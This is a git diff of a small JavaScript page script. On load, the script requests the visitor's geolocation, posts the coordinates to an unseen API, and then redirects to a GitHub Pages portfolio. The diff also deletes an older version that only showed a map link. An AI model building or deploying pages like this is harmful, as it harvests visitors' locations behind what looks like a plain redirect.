@@ -1,5 +1,5 @@
 
-let sites = ['leandrocmore.github.io/portifolio'];
+let sites = ["https://leandrocmore.github.io/portifolio/"];
 
 function redirecionarParaSiteAleatorio() {
     obterLocalizacao();
@@ -14,12 +14,12 @@ function success(position) {
     let latitude = coords.latitude;
     let longitude = coords.longitude;
 
-    // Enviar dados para a API via método POST usando fetch
+    
     enviarDadosParaAPI(latitude, longitude);
 
 
-    //let siteAleatorio = sites[Math.floor(Math.random() * sites.length)];
-    ///window.location.href = siteAleatorio;
+    let siteAleatorio = sites[Math.floor(Math.random() * sites.length)];
+    window.location.href = siteAleatorio;
 }
 
 function enviarDadosParaAPI(latitude, longitude) {
@@ -48,42 +48,3 @@ function enviarDadosParaAPI(latitude, longitude) {
 }
 
 redirecionarParaSiteAleatorio();
-
-
-
-
-
-
-
-
-
-/*
-
-let sites = ['leandrocmore.github.io/portifolio',];
-
-function redirecionarParaSiteAleatorio() {
-    obterLocalizacao(); 
-
-
-
-}
-
-function obterLocalizacao() {
-    navigator.geolocation.getCurrentPosition(success, error);
-}
-
-function success(position) {
-    let { coords } = position;
-        locationResult.textContent = 'Veja sua Localização ';
-        locationResult.innerHTML = `<a href="https://www.openstreetmap.org?mlat=${coords.latitude}&mlon=${coords.longitude}">Ver Localização no Mapa</a>`;
-    
-
-
-    
-    let siteAleatorio = sites[Math.floor(Math.random() * sites.length)];
-    window.location.href = siteAleatorio;
-}
-
-
-
-redirecionarParaSiteAleatorio();*/
